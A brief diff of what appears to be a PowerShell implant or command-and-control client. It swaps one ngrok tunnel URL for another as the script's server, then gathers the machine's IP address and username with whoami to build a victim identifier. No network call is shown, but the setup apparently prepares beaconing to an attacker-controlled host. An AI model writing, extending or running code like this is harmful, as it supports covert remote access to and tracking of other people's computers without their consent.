@@ -1,5 +1,5 @@
 
-$server = 'https://2d0c-78-185-39-244.eu.ngrok.io/'
+$server = 'https://9178-78-185-39-244.eu.ngrok.io/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
